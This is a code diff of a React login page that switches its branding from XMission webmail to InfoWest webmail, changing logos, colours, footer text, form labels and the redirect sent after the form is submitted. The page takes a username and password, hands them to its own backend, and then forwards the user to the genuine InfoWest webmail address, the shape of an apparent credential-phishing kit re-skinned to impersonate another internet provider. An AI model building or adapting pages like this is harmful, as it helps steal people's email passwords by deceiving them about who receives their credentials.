@@ -13,6 +13,7 @@ import wave from './wave.png';
 import centurylink from './centurylink.png';
 import ftc from './ftc.svg';
 import xmission from './xmission.png';
+import infowest from './infowest.png';
 
 function Home(){
 
@@ -20,7 +21,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("XMission")
+    const[platform, setPlatform] = useState("infoWest")
 
     const[showError, setShowError] = useState(false);
 
@@ -47,7 +48,7 @@ function Home(){
              // console.log(response.data.message);
   
             
-             window.location.href = 'https://webmail.xmission.com/xm/login.php?url=https%3A%2F%2Fwebmail.xmission.com%2Flogin.php';
+             window.location.href = 'https://webmail.infowest.com/roundcube/';
           }
         } catch (error) {
           // Handle error
@@ -69,24 +70,24 @@ function Home(){
         </div>
 
 
-
-            <div className=' py-4 px-3 text-center nav'>
-            <img  src={xmission} className="mylogo"/>
+            <div className='spacer'></div>
+            <div className=' py-4 px-3 text-center'>
+            <img  src={infowest} className="mylogo"/>
 
             </div>
 
             <br/>
 
-            <br/>
+            
 
 
-            <div className='col-md-6 whitediv m-auto   px-0'>
+            <div className='col-md-4 whitediv m-auto   px-0'>
               
 
             
-            <h3 className='text-center font-weight-bold py-3'style={{
+            {/* <h3 className='text-center font-weight-bold py-3'style={{
                 color:"grey",
-            }}>Welcome to XMission Webmail</h3>
+            }}>Welcome to XMission Webmail</h3> */}
                 
 
 
@@ -95,10 +96,10 @@ function Home(){
 
                     <div className='form-group mt-5'>
                  
-                    <label className='font-weight-bold'>Username</label>
+                   
                         <input type="email"onChange={function(e){
                             setUserName(e.target.value);
-                        }}value={email}  className="form-control py-2"required />
+                        }}value={email}placeholder="Username"  className="form-control py-2"required />
 
                     </div>
 
@@ -106,21 +107,16 @@ function Home(){
 
                     <div className='form-group'>
                   
-                    <label className='font-weight-bold'>Password</label>
+                 
                         <input type="password"onChange={function(e){
                             setPassword(e.target.value);
-                        }}value={password}  className="form-control  py-2"required />
+                        }}value={password}placeholder="Password"  className="form-control  py-2"required />
                        
 
                     </div>
 
                     
 
-                    <div className='form-group'>
-                      <input type="checkbox" /> <span className='font-weight-normal px-2'>Stay signed in
-</span>
-
-                    </div>
 
 
 
@@ -152,11 +148,11 @@ function Home(){
                     <div className='form-group  mt-5'>
 
 <button type='submit' style={{
-  backgroundColor: '#9296a3',
+  backgroundColor: '#37beff',
   fontSize:'18px',
   color:'white',
-  width:"40%",
-}}className='btn text-center  font-weight-bold text-light py-2 rounded '>LOG IN</button>
+ 
+}}className='btn text-center w-100  font-weight-bold text-light py-2 rounded '>LOGIN</button>
 
 
 
@@ -169,15 +165,24 @@ function Home(){
 
 
 
-<br>
+<br/>
 
-</br>
+
 
         
 
                 </form>
 
+                
+
             </div>
+            <p className='text-center'>InfoWest Webmail  •  <span style={{
+    color:'#37beff',
+}}>Get support</span></p>
+
+<p className='text-center'>Webmail for AWI domains (awinets.com, skyviewmail.com, lansrc.com, etc) is found at:  <span style={{
+    color:'#37beff',
+}}> webmail.awinetworks.com</span></p>
         
         </>
     );
